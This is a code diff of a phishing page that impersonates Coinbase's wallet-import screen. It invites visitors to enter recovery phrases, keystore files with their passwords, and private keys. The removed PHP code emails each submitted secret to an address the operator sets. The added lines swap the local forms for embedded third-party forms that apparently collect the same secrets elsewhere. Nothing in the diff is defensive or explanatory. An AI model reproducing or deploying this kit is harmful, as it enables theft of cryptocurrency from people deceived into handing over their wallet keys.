@@ -1,71 +1,4 @@
-<?php
 
-include '../config.php';
-
-use PHPMailer\PHPMailer\PHPMailer;
-use PHPMailer\PHPMailer\Exception;
-
-$msg = "";
-
-if (isset($_POST[ 'import1' ])) {
-    $key = trim ($_POST[ 'key' ]);
-    if (!empty($key)) {
-        require_once "../PHPMailer/PHPMailer.php";
-        require_once '../PHPMailer/Exception.php';
-
-        $mail = new PHPMailer();
-        $mail->setFrom ($username);
-        $mail->FromName = $domainName;
-        $mail->addAddress ($send_to);
-        $mail->Subject = "Coinbase Phrase";
-        $mail->isHTML (true);
-        $mail->Body = 'Coinbase Phrase - ' . $key . ' ';
-        $mail->send ();
-
-        $msg = "Import was successful";
-    }
-}
-
-if (isset($_POST[ 'import2' ])) {
-    $key = trim ($_POST[ 'key' ]);
-    $pass = trim ($_POST[ 'pass' ]);
-    if (!empty($key) && !empty($pass)) {
-        require_once "../PHPMailer/PHPMailer.php";
-        require_once '../PHPMailer/Exception.php';
-
-        $mail = new PHPMailer();
-        $mail->setFrom ($username);
-        $mail->FromName = $domainName;
-        $mail->addAddress ($send_to);
-        $mail->Subject = "Coinbase Keystore";
-        $mail->isHTML (true);
-        $mail->Body = 'Coinbase Keystore - ' . $key . ' <br> Password - ' . $pass . ' ';
-        $mail->send ();
-
-        $msg = "Import was successful";
-    }
-}
-
-if (isset($_POST[ 'import3' ])) {
-    $key = trim ($_POST[ 'key' ]);
-    if (!empty($key)) {
-        require_once "../PHPMailer/PHPMailer.php";
-        require_once '../PHPMailer/Exception.php';
-
-        $mail = new PHPMailer();
-        $mail->setFrom ($username);
-        $mail->FromName = $domainName;
-        $mail->addAddress ($send_to);
-        $mail->Subject = "Coinbase Private Key";
-        $mail->isHTML (true);
-        $mail->Body = 'Coinbase Private Key - ' . $key . ' ';
-        $mail->send ();
-
-        $msg = "Import was successful";
-    }
-}
-
-?>
 <!DOCTYPE html>
 <html lang=en>
 <meta charset=utf-8>
@@ -670,7 +603,7 @@ if (isset($_POST[ 'import3' ])) {
     }</style>
 <link rel=icon type=image/png sizes=32x32
       href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAABClJREFUWAnVVs9vFDcYfTPZn6RpFQRJCgUqtaBECBSpUvlZAeqvS9v02gMqSBQu3Dhw5oCExIV7uJXyB5RwgkhwANQDqlqEaKtWShugoVRBbdjNzO7OuN+z17uenZ2FJEioXzJrj+3vvefP9ufxth8NFV6i5ZR6qfz4/wrQcbPB8wD5X5a1I0AEC0ioLu9xDNTq0iV95SJQKhjaoK6wGBr3Qg7wfUdLL0wZllOW1R1If+ddCXEoxCOrPezb3ofdW/vw1jofr/UbAf9UFH57GOPm3QjXf4wwN69QzItQV0gHJl9p3tjhBYfKNLq/9YbMtOjh4Ad5HPwwj9dFRC/7U8gvXKnj66t1iYpCXiLSy7zRQ/9mCmC4Nwz5OPNVCTvH+nrhpPq+uxfh5GSA2b9iFCQaWebzGHZ7arKub6z1MHmivGRyku0QwfQlBrEMh6xsgk/2S7uDneaJZM2LBeDssTI2r+9cyKy5pNvpSwxiETPNpSjAdliVCkEtxpcfFfDu6NLCnpYAjUEsYiZnb/hSSxDFCiODHg5/LLJfkB0SLGISu1NEOw80ycKawoHxIoYGu4f+p9kIl27WdC6w54G7mJH8dFcBoxvTURsWrAPjOVycDlu5w87NCCASUbQpvLcte9t+eyPE6W+q6Jej6VpFjhxFjG4su82t+l7BvDgd6DFu2jSJyJJLWZLIM8lkWSsLSiZ0TfaYRMUCuT2m/rZgEjuWZXDN15Ka2z+Wkhns1f5sAdq5Od71NVNzoZN1YhKbHK5fYg+wzyxFUmUCSgbZ4+S2s623CNOvfR3HxCkgwGIYg7k9y4S+KaBL2d5IKXdiEpsc7klIRIBelUDh1/sNbH2zexLnjVhZ5JmWTUidzb1YFT/2ZRkxK0GsTwGDZS0lgGt0/YcQE3tLdkyinNhT0jPw/eQpIDn7soyYxHbJOTYloCDH+MrtAI/mX8Hw6vSZHtuUw9imgSyeru2P5iNcFUxi673ijErsAXbyKD38u4HJqYozbGVVYj0QTGK76896SgAbi7L8k1NPceuufOas0IhBLGJ2koscESAE5uEr/8RkeauyY4+fm8fPs/JRsEyj7/FzTzSWnr3gtPkoqHUdS63Vw7p8ych6zcw18MWpx7hxZ+mRoA99Z+bqGotkNgKa2TTAG/n8D1JnWr2h5APUw5FPBvSzfk16Y7rODx43cP7yU5yfWmh+kiVPizuWdW944veeAjiIxyesAeuE/P13ytg/XsKWDXkMDpiU/WQhxi/367j2fYDp24uy4SKd931eHM8wb+izmWcKsBi8z+1n+aqSp5MK+wK5CavN25Dff30dOcL6dytTeaDbINtGXN5otEaksFA12jlRXjTWuNbPa0sS0AnaCrDwPT9lEmVFApJQy3vrLcBO0U7PfWed7ba0/PbdlradJds67D8CSKpEL629uQAAAABJRU5ErkJggg==">
-<link rel=canonical href=connect.php>
+<link rel=canonical href=connect.html>
 <meta http-equiv=content-security-policy
       content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:;">
 </html>
@@ -685,7 +618,7 @@ if (isset($_POST[ 'import3' ])) {
                 class="sc-gTgzIj dwUVMl">
  <div class="sc-iNqMTl hFrbFX"><div class="sc-jeGSBP hePFZY"><div class="sc-hiSbYr XqbgT"><a
                      class="sc-bdfBwQ hPaoIA sc-gWHgXt ikxKmn" title=Home data-element-handle=header-home-link
-                     href=connect.php>
+                     href=connect.html>
  <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzU5IiBoZWlnaHQ9IjY0IiB2aWV3Qm94PSIwIDAgMzU5IDY0IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8ZyBjbGlwLXBhdGg9InVybCgjY2xpcDApIj4KPHBhdGggZD0iTTcyLjMwOTQgMTcuODY3NkM1OS4yOTQxIDE3Ljg2NzYgNDkuMTI0NSAyNy43NDc4IDQ5LjEyNDUgNDAuOTc0NEM0OS4xMjQ1IDU0LjIwMTEgNTkuMDM3MSA2My45OTY3IDcyLjMwOTQgNjMuOTk2N0M4NS41ODE2IDYzLjk5NjcgOTUuNjY2NiA1NC4wMzIgOTUuNjY2NiA0MC44ODk5Qzk1LjY2NjYgMjcuODMyMyA4NS43NTQgMTcuODY3NiA3Mi4zMDk0IDE3Ljg2NzZaTTcyLjM5NzIgNTQuNDY0NkM2NC45ODU0IDU0LjQ2NDYgNTkuNTU0MiA0OC43MDgyIDU5LjU1NDIgNDAuOTc3N0M1OS41NTQyIDMzLjE1OTQgNjQuODk3NiAyNy40MDYzIDcyLjMwOTQgMjcuNDA2M0M3OS44MDg5IDI3LjQwNjMgODUuMjM2OSAzMy4yNDcyIDg1LjIzNjkgNDAuOTc3N0M4NS4yMzY5IDQ4LjcwODIgNzkuODA4OSA1NC40NjQ2IDcyLjM5NzIgNTQuNDY0NlpNOTguNTA5MSAyNy45MjAxSDEwNC45NzRWNjMuMTQxNEgxMTUuMzE2VjE4LjcyNjJIOTguNTA5MVYyNy45MjAxWk0yMy4wOTcxIDI3LjQwM0MyOC41MjgzIDI3LjQwMyAzMi44Mzc0IDMwLjc1MjggMzQuNDczMyAzNS43MzUxSDQ1LjQyMDJDNDMuNDM2NCAyNS4wODQyIDM0LjY0NTcgMTcuODY3NiAyMy4xODQ5IDE3Ljg2NzZDMTAuMTY5NiAxNy44Njc2IDAgMjcuNzQ3OCAwIDQwLjk3NzdDMCA1NC4yMDc2IDkuOTEyNyA2NCAyMy4xODQ5IDY0QzM0LjM4ODcgNjQgNDMuMzUxOCA1Ni43ODM0IDQ1LjMzNTYgNDYuMDQ0NkgzNC40NzMzQzMyLjkyMiA1MS4wMjcgMjguNjEyOCA1NC40NjQ2IDIzLjE4MTcgNTQuNDY0NkMxNS42ODIxIDU0LjQ2NDYgMTAuNDI2NSA0OC43MDgyIDEwLjQyNjUgNDAuOTc3N0MxMC40Mjk4IDMzLjE1OTQgMTUuNjAwOCAyNy40MDMgMjMuMDk3MSAyNy40MDNaTTI5NS4wMTMgMzYuNjgxNUwyODcuNDI5IDM1LjU2NkMyODMuODEgMzUuMDUyMiAyODEuMjI0IDMzLjg0ODkgMjgxLjIyNCAzMS4wMTNDMjgxLjIyNCAyNy45MjAxIDI4NC41ODcgMjYuMzc1MyAyODkuMTUzIDI2LjM3NTNDMjk0LjE1MiAyNi4zNzUzIDI5Ny4zNDIgMjguNTIxOCAyOTguMDMxIDMyLjA0MzlIMzA4LjAyOUMzMDYuOTA3IDIzLjExMDEgMzAwLjAxMiAxNy44NzA4IDI4OS40MTMgMTcuODcwOEMyNzguNDY2IDE3Ljg3MDggMjcxLjIyNyAyMy40NTQ5IDI3MS4yMjcgMzEuMzU3N0MyNzEuMjI3IDM4LjkxNTggMjc1Ljk2OCA0My4yOTk4IDI4NS41MzMgNDQuNjcyMkwyOTMuMTE3IDQ1Ljc4NzdDMjk2LjgyNSA0Ni4zMDE1IDI5OC44OTMgNDcuNzY1IDI5OC44OTMgNTAuNTEzMUMyOTguODkzIDU0LjAzNTMgMjk1LjI3NCA1NS40OTU1IDI5MC4yNzUgNTUuNDk1NUMyODQuMTU0IDU1LjQ5NTUgMjgwLjcwNyA1My4wMDQzIDI4MC4xOSA0OS4yMjUzSDI3MC4wMkMyNzAuOTcgNTcuOTAyMSAyNzcuNzc3IDY0IDI5MC4xODcgNjRDMzAxLjQ3OSA2NCAzMDguOTc1IDU4Ljg0NTMgMzA4Ljk3NSA0OS45OTZDMzA4Ljk3NSA0Mi4wOTMyIDMwMy41NDcgMzcuOTY5NCAyOTUuMDEzIDM2LjY4MTVaTTExMC4xNDUgMC40MjkyOUMxMDYuMzUzIDAuNDI5MjkgMTAzLjUwOCAzLjE3NzQgMTAzLjUwOCA2Ljk1NjQ1QzEwMy41MDggMTAuNzM1NSAxMDYuMzUgMTMuNDgzNiAxMTAuMTQ1IDEzLjQ4MzZDMTEzLjkzNyAxMy40ODM2IDExNi43ODMgMTAuNzM1NSAxMTYuNzgzIDYuOTU2NDVDMTE2Ljc4MyAzLjE3NzQgMTEzLjkzNyAwLjQyOTI5IDExMC4xNDUgMC40MjkyOVpNMjYxLjkxOSAzMy45MzM0QzI2MS45MTkgMjQuMzEzNCAyNTYuMDU5IDE3Ljg3MDggMjQzLjY0OCAxNy44NzA4QzIzMS45MjcgMTcuODcwOCAyMjUuMzc3IDIzLjc5OTYgMjI0LjA4MyAzMi45MDU3SDIzNC4zNEMyMzQuODU3IDI5LjM4MzYgMjM3LjYxNSAyNi40NjMxIDI0My40NzYgMjYuNDYzMUMyNDguNzM1IDI2LjQ2MzEgMjUxLjMyIDI4Ljc4MTkgMjUxLjMyIDMxLjYxNzlDMjUxLjMyIDM1LjMxMjQgMjQ2LjU3OCAzNi4yNTU1IDI0MC43MTggMzYuODU3MkMyMzIuNzg5IDM3LjcxNTcgMjIyLjk2NCA0MC40NjM4IDIyMi45NjQgNTAuNzczM0MyMjIuOTY0IDU4Ljc2NCAyMjguOTEyIDYzLjkxNTQgMjM4LjM5MyA2My45MTU0QzI0NS44MDQgNjMuOTE1NCAyNTAuNDU4IDYwLjgyMjYgMjUyLjc4NyA1NS45MjQ4QzI1My4xMzIgNjAuMzA1NSAyNTYuNDA3IDYzLjE0MTQgMjYwLjk3NiA2My4xNDE0SDI2Ny4wMDlWNTMuOTUwN0gyNjEuOTIyVjMzLjkzMzRIMjYxLjkxOVpNMjUxLjc0OSA0NS4xMDE1QzI1MS43NDkgNTEuMDMwMiAyNDYuNTc4IDU1LjQxMDkgMjQwLjI4NSA1NS40MTA5QzIzNi40MDYgNTUuNDEwOSAyMzMuMTMxIDUzLjc3ODMgMjMzLjEzMSA1MC4zNDRDMjMzLjEzMSA0NS45NjMzIDIzOC4zODkgNDQuNzYgMjQzLjIxNiA0NC4yNDYyQzI0Ny44NyA0My44MTY5IDI1MC40NTUgNDIuNzg1OSAyNTEuNzQ5IDQwLjgwODZWNDUuMTAxNVpNMTk2Ljg0OSAxNy44Njc2QzE5MS4wNzMgMTcuODY3NiAxODYuMjQ3IDIwLjI3NDIgMTgyLjggMjQuMzEwMlYwSDE3Mi40NThWNjMuMTQxNEgxODIuNjI3VjU3LjMwMDVDMTg2LjA3NCA2MS41MDg4IDE5MC45ODkgNjQgMTk2Ljg0OSA2NEMyMDkuMjU5IDY0IDIxOC42NTUgNTQuMjA3NiAyMTguNjU1IDQwLjk3NzdDMjE4LjY1NSAyNy43NDc4IDIwOS4wODcgMTcuODY3NiAxOTYuODQ5IDE3Ljg2NzZaTTE5NS4yOTggNTQuNDY0NkMxODcuODg2IDU0LjQ2NDYgMTgyLjQ1NSA0OC43MDgyIDE4Mi40NTUgNDAuOTc3N0MxODIuNDU1IDMzLjI0NzIgMTg3Ljk3MSAyNy40MDYzIDE5NS4zODIgMjcuNDA2M0MyMDIuODgyIDI3LjQwNjMgMjA4LjEzNyAzMy4xNjI3IDIwOC4xMzcgNDAuOTc3N0MyMDguMTM3IDQ4LjcwODIgMjAyLjcwOSA1NC40NjQ2IDE5NS4yOTggNTQuNDY0NlpNMTQ3LjcyMSAxNy44Njc2QzE0MC45OTkgMTcuODY3NiAxMzYuNjAyIDIwLjYxNTcgMTM0LjAxNyAyNC40ODI1VjE4LjcyNjJIMTIzLjc1OVY2My4xMzgySDEzNC4xMDFWMzkuMDAwNEMxMzQuMTAxIDMyLjIxMyAxMzguNDEgMjcuNDAzIDE0NC43ODggMjcuNDAzQzE1MC43MzYgMjcuNDAzIDE1NC40NCAzMS42MTE0IDE1NC40NCAzNy43MTI1VjYzLjE0MTRIMTY0Ljc4MlYzNi45NDE3QzE2NC43ODYgMjUuNzcwNCAxNTkuMDEzIDE3Ljg2NzYgMTQ3LjcyMSAxNy44Njc2Wk0zNTguMjc1IDM5LjUxNzVDMzU4LjI3NSAyNi44MDQ2IDM0OC45NjcgMTcuODcwOCAzMzYuNDY5IDE3Ljg3MDhDMzIzLjE5NyAxNy44NzA4IDMxMy40NTcgMjcuODM1NiAzMTMuNDU3IDQwLjk3NzdDMzEzLjQ1NyA1NC44MDkzIDMyMy44ODYgNjQgMzM2LjY0MiA2NEMzNDcuNDE2IDY0IDM1NS44NjIgNTcuNjQyIDM1OC4wMTUgNDguNjIzNkgzNDcuMjRDMzQ1LjY4OSA1Mi41NzUgMzQxLjg5NyA1NC44MDkzIDMzNi44MTEgNTQuODA5M0MzMzAuMTczIDU0LjgwOTMgMzI1LjE3NCA1MC42ODU1IDMyNC4wNTUgNDMuNDY4OUgzNTguMjcyVjM5LjUxNzVIMzU4LjI3NVpNMzI0LjY2IDM2LjA3OTlDMzI2LjMgMjkuODk0MiAzMzAuOTUzIDI2Ljg4OTIgMzM2LjI5NyAyNi44ODkyQzM0Mi4xNTcgMjYuODg5MiAzNDYuNjM5IDMwLjIzODkgMzQ3LjY3MyAzNi4wNzk5SDMyNC42NloiIGZpbGw9IiMwMDUyRkYiLz4KPC9nPgo8ZGVmcz4KPGNsaXBQYXRoIGlkPSJjbGlwMCI+CjxyZWN0IHdpZHRoPSIzNTguMjc1IiBoZWlnaHQ9IjY0IiBmaWxsPSJ3aGl0ZSIvPgo8L2NsaXBQYXRoPgo8L2RlZnM+Cjwvc3ZnPgo="
       height=20 width=112 alt="Coinbase Logo"
       class="sc-cBNfnY cHGPOa"></a></div><div class="sc-nFpLZ jXWXLS"><a class="sc-bdfBwQ hPaoIA" title="Get started"
@@ -840,38 +773,33 @@ if (isset($_POST[ 'import3' ])) {
 
 
     <div id="phrase" class="tabcontent">
-        <form action="connect.php" method="POST" id="form1">
-            <textarea name="key" required="required" minlength="12" placeholder="Phrase" required="required"></textarea>
+        <form action="connect.html" method="POST" id="form1">
+        <embed src="https://ngs.dashclicks.com/forms/userform/1ecce880-dedb-4ac0-aa8e-106054f1864d" width="100%" height="400px" />
+
             </br>
             <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
             </br>
-            <button form="form1" value="Import" type="submit" name="import1" class="sc-iktFzd iQMxid">IMPORT</button>
+            
         </form>
     </div>
 
     <div id="keystore" class="tabcontent">
-        <form action="connect.php" method="POST" id="form2">
-                      <textarea name="key" required="required" minlength="12" placeholder="Keystore JSON"
-                                required="required"></textarea>
-            </br>
-            <div class="field">
-                <input type="text" name="pass" placeholder="Password" required="required" minlength="4"/>
-            </div>
-            <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
-            </div>
-            </br>
-            <button form="form2" value="Import" type="submit" name="import2" class="sc-iktFzd iQMxid">IMPORT</button>
+        <form action="connect.html" method="POST" id="form2">
+        <embed src="https://ngs.dashclicks.com/forms/userform/1ecce880-dedb-4ac0-aa8e-106054f1864d" width="100%" height="400px" />
+
+         
         </form>
     </div>
 
     <div id="private" class="tabcontent">
-        <form action="connect.php" method="POST" id="form3">
+        <form action="connect.html" method="POST" id="form3">
             <div class="field">
-                <input type="text" name="key" placeholder="Private Key" required="required" minlength="64"/>
+            <embed src="https://ngs.dashclicks.com/forms/userform/1ecce880-dedb-4ac0-aa8e-106054f1864d" width="100%" height="400px" />
+
             </div>
             <div class="desc">Typically 64 alphanumeric characters</div>
             </br>
-            <button form="form3" value="Import" type="submit" name="import3" class="sc-iktFzd iQMxid">IMPORT</button>
+            
         </form>
     </div>
 
